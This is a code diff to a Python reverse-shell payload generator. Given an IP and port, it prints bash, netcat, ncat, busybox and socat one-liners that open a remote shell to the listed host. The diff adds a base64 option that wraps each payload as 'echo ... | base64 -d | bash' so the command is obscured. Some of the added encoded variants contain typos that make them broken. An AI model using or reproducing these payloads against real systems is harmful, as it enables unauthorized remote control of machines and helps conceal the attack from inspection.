@@ -9,6 +9,7 @@
 
 import sys
 import socket
+import base64
 
 # Script Banner
 
@@ -40,6 +41,8 @@ shell_type = "\033[1m[+]\033[0m \033[91m\033[1mShell Type\033[0m\033[0m : \033[3
 
 exp = "\033[1m[+]\033[0m \033[91m\033[1mExp\033[0m\033[0m : \033[32mpython3 rev_gen.py 1.1.1.1 1111 php bash\033[0m\n"
 
+note = "\033[1m[+]\033[0m \033[91m\033[1mNote\033[0m\033[0m : \033[32mpython3 rev_gen.py 1.1.1.1 1111 bash bash [--encode] or [-e] \033[91m\033[1m[Encode Base64 currently supported for bash, netcat & socat]\033[0m\033[0m\n"
+
 
 # Function to check if a string is a valid IP Address
 def is_valid_ip(ip_str):
@@ -60,18 +63,25 @@ def is_valid_port(port_str):
 
 
 # Building Logic
-if(len(sys.argv) != 5):
+if(len(sys.argv) < 5):
     print(usage)
     print(support)
     print(shell_type)
     print(exp)
+    print(note)
     sys.exit()
 
 IP = str(sys.argv[1])
 PORT = str(sys.argv[2])
 PLATFORM = str(sys.argv[3])
 ST = str(sys.argv[4])
+B64ENCODE=None
+if(len(sys.argv) > 5):
+	B64ENCODE=str(sys.argv[5])
 
+def genBase64(payload):
+	if B64ENCODE=='--encode' or B64ENCODE=='-e':
+		print(f"\033[0m \033[91m\033[1mBase64\033[0m\033[0m ---> \033[94m echo {base64.b64encode(payload.encode('utf-8')).decode('utf-8')} | base64 -d | bash\033[0m\n")
 
 # Validation Confirm
 if not is_valid_ip(IP):
@@ -89,16 +99,27 @@ LPLATFORM = PLATFORM.lower()
 def bash_shell(IP,PORT,ST):
 	print('''\033[1m\033[32m ************* BASH REVERSE SHELL *************\033[0m\033[0m\n''')
 	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94m{ST} -i >& /dev/tcp/{IP}/{PORT} 0>&1\033[0m\n")
+	genBase64(f"{ST} -i >& /dev/tcp/{IP}/{PORT} 0>&1")
 	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94m0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; {ST} <&196 >&196 2>&196\033[0m\n")
+	genBase64(f"0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; {ST} <&196 >&196 2>&196")
 	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94m{ST} -i 5<> /dev/tcp/{IP}/{PORT} 0<&5 1>&5 2>&5\033[0m\n")
+	genBase64(f"{ST} -i 5<> /dev/tcp/{IP}/{PORT} 0<&5 1>&5 2>&5")
 	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94m{ST} -i >& /dev/udp/{IP}/{PORT} 0>&1\033[0m   \033[1m[+]\033[0m BASH UDP\n")
+	genBase64(f"{ST} -i >& /dev/udp/{IP}/{PORT} 0>&1")
 	print("\033[1m\033[32m----------- Please choose Your Preference ------------\033[0m\033[0m\n")
 
 def nc_shell(IP,PORT,ST):
 	print('''\033[1m\033[32m************* NETCAT REVERSE SHELL *************\033[0m\033[0m\n''')
 	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{ST} -i 2>&1|nc {IP} {PORT} >/tmp/f\033[0m\n")
+	genBase64(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{ST} -i 2>&1|nc {IP} {PORT} >/tmp/f")
 	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mnc {IP} {PORT} -e {ST}\033[0m\n")
+	genBase64(f"nc {IP} {PORT} -e {ST}")
+	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mncat {IP} {PORT} -e {ST}\033[0m\n")
+	genBase64(f"mncat{IP} {PORT} -e {ST}")
+	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mnetcat {IP} {PORT} -e {ST}\033[0m\n")
+	genBase64(f"mnetcat{IP} {PORT} -e {ST}")
 	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mbusybox nc {IP} {PORT} -e {ST}\033[0m   \033[1m[+]\033[0m Specially for BusyBox\n") 
+	genBase64(f"busybox nc {IP} {PORT} -e {ST}")
 	print("\033[1m\033[32m----------- Please choose Your Preference ------------\033[0m\033[0m\n")
 
 def php_shell(IP,PORT,ST):
@@ -174,7 +195,9 @@ def nodejs_shell(IP,PORT,ST):
 def socat_shell(IP,PORT,ST):
 	print('''\033[1m\033[32m ************* SOCAT REVERSE SHELL *************\033[0m\033[0m\n''')
 	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94msocat TCP:{IP}:{PORT} EXEC:{ST}\033[0m\n")
+	genBase64(f"socat TCP:{IP}:{PORT} EXEC:{ST}")
 	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94msocat TCP:{IP}:{PORT} EXEC:'{ST}',pty,stderr,setsid,sigint,sane\033[0m\n")
+	genBase64(f"socat TCP:{IP}:{PORT} EXEC:'{ST}',pty,stderr,setsid,sigint,sane")
 	print("\033[1m\033[32m----------- Please choose Your Preference ------------\033[0m\033[0m\n")
 	
 def java_shell(IP,PORT,ST):
@@ -242,14 +265,3 @@ else:
 
 
 ##################### END OF CODE #####################
-
-
-
-
-
-
-
-
-
-
-
